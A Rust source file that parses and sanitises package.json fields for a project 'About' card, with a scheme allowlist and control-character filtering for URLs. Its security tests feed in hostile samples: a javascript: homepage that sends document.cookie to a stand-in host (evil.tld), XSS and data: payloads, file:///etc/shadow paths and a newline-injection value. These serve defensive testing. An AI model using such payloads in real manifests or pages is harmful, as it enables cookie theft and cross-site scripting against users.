//! `package.json` parsing and the npm-shorthand URL / person normalisers.

use std::collections::HashSet;
use std::path::{Path, PathBuf};
use std::sync::{Mutex, OnceLock, PoisonError};

use ops_about::text_util::trim_nonempty;
use serde::Deserialize;

use super::repo_url::{append_tree_directory, normalize_repo_url};

/// The `package.json` fields the Node about providers render, normalised.
///
/// Every string is trimmed and dropped when empty, and the two URL fields
/// have passed the manifest-URL policy in [`pick_manifest_url`]. A field the
/// manifest omits — or one the policy rejects — is `None`, so the About card
/// renders it as missing. `has_packagemanager` carries the raw
/// `packageManager` value for [`crate::package_manager`] to interpret.
///
/// Crate-internal: `mod package_json` is private, so the `pub` spelling is
/// the visibility the workspace-wide `clippy::redundant_pub_crate` policy
/// expects rather than a public API surface.
#[derive(Debug, Default)]
pub struct PackageJson {
    pub name: Option<String>,
    pub version: Option<String>,
    pub description: Option<String>,
    pub license: Option<String>,
    pub homepage: Option<String>,
    pub repository: Option<String>,
    pub authors: Vec<String>,
    pub engines_node: Option<String>,
    pub has_packagemanager: Option<String>,
}

#[derive(Debug, Deserialize)]
struct RawPackage {
    name: Option<String>,
    version: Option<String>,
    description: Option<String>,
    license: Option<LicenseField>,
    homepage: Option<String>,
    repository: Option<RepositoryField>,
    author: Option<PersonField>,
    #[serde(default)]
    contributors: Vec<PersonField>,
    engines: Option<Engines>,
    #[serde(rename = "packageManager")]
    package_manager: Option<String>,
}

#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum LicenseField {
    Text(String),
    Object { r#type: Option<String> },
}

/// npm's package.json `repository` field. The object form supports a
/// `directory` property that points at a sub-path inside the repository, used
/// by monorepos to distinguish member packages that share one root URL.
#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum RepositoryField {
    Text(String),
    Object {
        url: Option<String>,
        /// Sub-path within the repository (npm-supported, used by monorepos
        /// like babel/react-router). Surfaced as a `/tree/HEAD/<directory>`
        /// suffix on the normalised URL so the About card distinguishes
        /// member packages that share a repository root.
        directory: Option<String>,
    },
}

#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum PersonField {
    Text(String),
    Object {
        name: Option<String>,
        email: Option<String>,
    },
}

#[derive(Debug, Deserialize)]
struct Engines {
    node: Option<String>,
}

/// Read and normalise the root `package.json`, or `None` when it is absent
/// or unparseable.
pub fn parse_package_json(project_root: &Path) -> Option<PackageJson> {
    // The read goes through the shared cache so the sister
    // `workspace_member_globs` site pays no second IO on the same file; each
    // caller still deserialises its own projection.
    let content = ops_about::manifest_cache::for_filename("package.json").read(project_root)?;
    let raw: RawPackage = match serde_json::from_str(&content) {
        Ok(r) => r,
        Err(e) => {
            warn_parse_failure(&project_root.join("package.json"), &e);
            return None;
        }
    };

    // The bound is `1 (author) + contributors.len()`, so one allocation
    // replaces growth through repeated `push`. `contributors` came from a
    // deserialised in-memory `Vec`, so its length is at most `isize::MAX` and
    // the `+ 1` cannot overflow `usize`.
    let mut authors = Vec::with_capacity(raw.contributors.len().saturating_add(1));
    if let Some(a) = raw.author {
        if let Some(s) = format_person(a) {
            authors.push(s);
        }
    }
    for c in raw.contributors {
        if let Some(s) = format_person(c) {
            authors.push(s);
        }
    }

    Some(PackageJson {
        name: trim_nonempty(raw.name),
        version: trim_nonempty(raw.version),
        description: trim_nonempty(raw.description),
        // Trim and drop-empty for both license forms: a whitespace-only
        // license must not render as a blank About bullet.
        license: raw.license.and_then(|l| match l {
            LicenseField::Text(s) => trim_nonempty(Some(s)),
            LicenseField::Object { r#type } => trim_nonempty(r#type),
        }),
        // `homepage` is untrusted manifest text: see [`pick_manifest_url`]
        // for the policy it must clear.
        homepage: pick_manifest_url(raw.homepage),
        // `normalize_repo_url` returns "" for a value it rejects (control
        // bytes, or a scheme outside the `http(s)` allowlist); surface that
        // as a missing field rather than an empty link in the About card.
        repository: raw.repository.and_then(|r| match r {
            // `normalize_repo_url` yields a `Cow<str>`, so the clean-URL path
            // stays alloc-free and only the owned field forces a copy.
            RepositoryField::Text(s) => trim_nonempty(Some(normalize_repo_url(&s).into_owned())),
            RepositoryField::Object { url, directory } => url.and_then(|u| {
                let base = normalize_repo_url(&u);
                if base.is_empty() {
                    return None;
                }
                Some(match trim_nonempty(directory) {
                    Some(dir) => append_tree_directory(&base, &dir),
                    None => base.into_owned(),
                })
            }),
        }),
        authors,
        // Trim and drop-empty so a whitespace-only `engines.node` does not
        // render as `Node    · …` in `build_stack_detail`.
        engines_node: raw.engines.and_then(|e| trim_nonempty(e.node)),
        has_packagemanager: raw.package_manager,
    })
}

/// Report a `package.json` that failed to deserialise, once per path for the
/// life of the process.
///
/// Both providers this crate registers deserialise their own projection of
/// the same manifest text, and `resolved_members` parses it again for the
/// identity card's package count, so a single syntax error is observed
/// several times per `ops about` run. Emitting one record per path keeps an
/// operator from hunting for a second broken manifest that does not exist,
/// and matches the process-lifetime caching of the manifest text itself in
/// `ops_about::manifest_cache`.
///
/// The path flows through the `Debug` formatter so embedded newlines or ANSI
/// escapes in an attacker-controlled checkout path cannot forge extra log
/// records; the serde error uses `Display`, which is the readable form.
pub fn warn_parse_failure(path: &Path, error: &serde_json::Error) {
    static WARNED: OnceLock<Mutex<HashSet<PathBuf>>> = OnceLock::new();
    let mut seen = WARNED
        .get_or_init(|| Mutex::new(HashSet::new()))
        .lock()
        .unwrap_or_else(PoisonError::into_inner);
    if !seen.insert(path.to_path_buf()) {
        return;
    }
    drop(seen);
    tracing::warn!(
        path = ?path.display(),
        error = %error,
        recovery = "defaults",
        "failed to parse package.json"
    );
}

/// Apply the manifest-URL policy to a `package.json` URL field: trim and
/// drop-empty, then drop the whole field when it carries any control or
/// Unicode formatting codepoint, then require an allowlisted `http(s)`
/// scheme.
///
/// Rejection drops the field — rendering as missing — rather than stripping
/// the offending part, because a partially-scrubbed URL is still a link a
/// consumer will follow. A `javascript:`, `data:` or `file:` URL is a live
/// XSS or local-file sink in any markdown / HTML consumer of
/// `ops about --json`, and a control character forges an extra line in the
/// About card and in log records. The Python provider's `pick_url` applies
/// the identical chain through the same `ops_about::text_util` helpers.
fn pick_manifest_url(raw: Option<String>) -> Option<String> {
    use ops_about::text_util::{contains_control_chars, has_allowed_url_scheme};
    trim_nonempty(raw)
        .filter(|s| !contains_control_chars(s))
        .filter(|s| has_allowed_url_scheme(s))
}

/// Render an npm `person` field (string or object form) as a display line,
/// or `None` when it carries no non-whitespace content — a whitespace-only
/// author must not render as an empty bullet in the About card.
fn format_person(p: PersonField) -> Option<String> {
    match p {
        PersonField::Text(s) => {
            let trimmed = s.trim();
            if trimmed.is_empty() {
                None
            } else {
                Some(trimmed.to_string())
            }
        }
        PersonField::Object { name, email } => {
            let name = trim_nonempty(name);
            let email = trim_nonempty(email);
            match (name, email) {
                (Some(n), Some(e)) => Some(format!("{n} <{e}>")),
                (Some(n), None) => Some(n),
                (None, Some(e)) => Some(format!("<{e}>")),
                (None, None) => None,
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Manifest paths reach `tracing::warn!` through the `?` formatter, so
    /// embedded newlines or ANSI escapes cannot forge multi-line log
    /// records. The assertion itself is shared, so the property stays pinned
    /// even if one provider's per-site test goes away.
    #[test]
    fn package_json_path_debug_escapes_control_characters() {
        let p = Path::new("a\nb\u{1b}[31mc/package.json");
        ops_about::test_support::assert_debug_escapes_control_chars(p.display());
    }

    #[test]
    fn format_person_email_only_wraps_in_brackets() {
        let p = PersonField::Object {
            name: None,
            email: Some("a@example.com".to_string()),
        };
        assert_eq!(format_person(p), Some("<a@example.com>".to_string()));
    }

    #[test]
    fn format_person_name_and_email() {
        let p = PersonField::Object {
            name: Some("Alice".to_string()),
            email: Some("a@example.com".to_string()),
        };
        assert_eq!(format_person(p), Some("Alice <a@example.com>".to_string()));
    }

    #[test]
    fn format_person_name_only() {
        let p = PersonField::Object {
            name: Some("Alice".to_string()),
            email: None,
        };
        assert_eq!(format_person(p), Some("Alice".to_string()));
    }

    #[test]
    fn format_person_empty_text() {
        assert_eq!(format_person(PersonField::Text(String::new())), None);
    }

    #[test]
    fn format_person_whitespace_text_is_dropped() {
        assert_eq!(format_person(PersonField::Text("   ".into())), None);
    }

    #[test]
    fn format_person_whitespace_object_components_dropped() {
        let p = PersonField::Object {
            name: Some("   ".into()),
            email: Some("\t".into()),
        };
        assert_eq!(format_person(p), None);
    }

    #[test]
    fn parse_package_json_whitespace_only_license_text_dropped() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"name":"x","license":"   "}"#,
        )
        .expect("write");
        let pkg = parse_package_json(dir.path()).expect("parse");
        assert_eq!(pkg.license, None);
    }

    #[test]
    fn parse_package_json_whitespace_only_license_object_type_dropped() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"name":"x","license":{"type":"\t"}}"#,
        )
        .expect("write");
        let pkg = parse_package_json(dir.path()).expect("parse");
        assert_eq!(pkg.license, None);
    }

    #[test]
    fn parse_package_json_whitespace_only_engine_node_dropped() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"name":"x","engines":{"node":"  "}}"#,
        )
        .expect("write");
        let pkg = parse_package_json(dir.path()).expect("parse");
        assert_eq!(pkg.engines_node, None);
    }

    #[test]
    fn parse_package_json_trims_whitespace_only_name_to_none() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"name":"   ","version":"\t","homepage":"  "}"#,
        )
        .expect("write");
        let pkg = parse_package_json(dir.path()).expect("parse");
        assert_eq!(pkg.name, None);
        assert_eq!(pkg.version, None);
        assert_eq!(pkg.homepage, None);
    }

    // Unit tests for `normalize_repo_url` and `append_tree_directory` live
    // next to the implementation in `super::repo_url`; the tests below drive
    // the same code through the `parse_package_json` entry point.

    #[test]
    fn repository_object_with_directory_appends_tree_path() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{
                "name": "@scope/foo",
                "version": "1.0.0",
                "repository": {
                    "type": "git",
                    "url": "https://github.com/example/mono.git",
                    "directory": "packages/foo"
                }
            }"#,
        )
        .unwrap();

        let parsed = parse_package_json(dir.path()).expect("parsed");
        assert_eq!(
            parsed.repository.as_deref(),
            Some("https://github.com/example/mono/tree/HEAD/packages/foo")
        );
    }

    #[test]
    fn repository_object_without_directory_matches_text_form() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{
                "name": "@scope/foo",
                "version": "1.0.0",
                "repository": {
                    "type": "git",
                    "url": "https://github.com/example/mono.git"
                }
            }"#,
        )
        .unwrap();

        let parsed = parse_package_json(dir.path()).expect("parsed");
        assert_eq!(
            parsed.repository.as_deref(),
            Some("https://github.com/example/mono")
        );
    }

    /// A `javascript:` (or `data:`, `file:`) repository value is rejected by
    /// the scheme allowlist, and the parser surfaces that as a missing field
    /// rather than an empty string.
    #[test]
    fn parse_drops_repository_with_disallowed_scheme() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{
                "name": "evil",
                "repository": "javascript:alert(document.domain)"
            }"#,
        )
        .unwrap();

        let parsed = parse_package_json(dir.path()).expect("parsed");
        assert_eq!(parsed.repository, None);
    }

    /// Same for the object form, where a rejected base URL must also
    /// suppress the `/tree/HEAD/<directory>` suffix.
    #[test]
    fn parse_drops_repository_object_with_disallowed_scheme() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{
                "name": "evil",
                "repository": { "url": "git+file:///etc/passwd", "directory": "packages/a" }
            }"#,
        )
        .unwrap();

        let parsed = parse_package_json(dir.path()).expect("parsed");
        assert_eq!(parsed.repository, None);
    }

    /// A `javascript:` homepage is a live XSS sink in any consumer that
    /// renders `ops about --json` output as a hyperlink. The field is dropped
    /// (rendered as missing), not stripped — the same treatment `repository`
    /// gets.
    #[test]
    fn parse_drops_homepage_with_javascript_scheme() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{
                "name": "x",
                "homepage": "javascript:fetch('https://evil.tld/?c='+document.cookie)"
            }"#,
        )
        .unwrap();

        let parsed = parse_package_json(dir.path()).expect("parsed");
        assert_eq!(parsed.homepage, None);
    }

    /// `data:` and `file:` homepages are dropped — the same sinks the scheme
    /// allowlist closes for `repository`.
    #[test]
    fn parse_drops_homepage_with_data_and_file_schemes() {
        for homepage in [
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "file:///etc/shadow",
        ] {
            let dir = tempfile::tempdir().unwrap();
            let pkg = format!(r#"{{"name":"x","homepage":"{homepage}"}}"#);
            std::fs::write(dir.path().join("package.json"), pkg).unwrap();

            let parsed = parse_package_json(dir.path()).expect("parsed");
            assert_eq!(
                parsed.homepage, None,
                "homepage {homepage:?} must be dropped"
            );
        }
    }

    /// An embedded LF forges an extra line in the About card (and in log
    /// records); the field is dropped entirely.
    #[test]
    fn parse_drops_homepage_with_embedded_lf() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            "{\n  \"name\": \"x\",\n  \"homepage\": \"https://demo.dev\\nINJECT\"\n}\n",
        )
        .unwrap();

        let parsed = parse_package_json(dir.path()).expect("parsed");
        assert_eq!(parsed.homepage, None);
    }

    /// An allowed-scheme, control-free homepage keeps flowing — the gate must
    /// not eat the legitimate field.
    #[test]
    fn parse_keeps_legitimate_homepage() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"name":"x","homepage":"https://demo.dev"}"#,
        )
        .unwrap();

        let parsed = parse_package_json(dir.path()).expect("parsed");
        assert_eq!(parsed.homepage.as_deref(), Some("https://demo.dev"));
    }
}
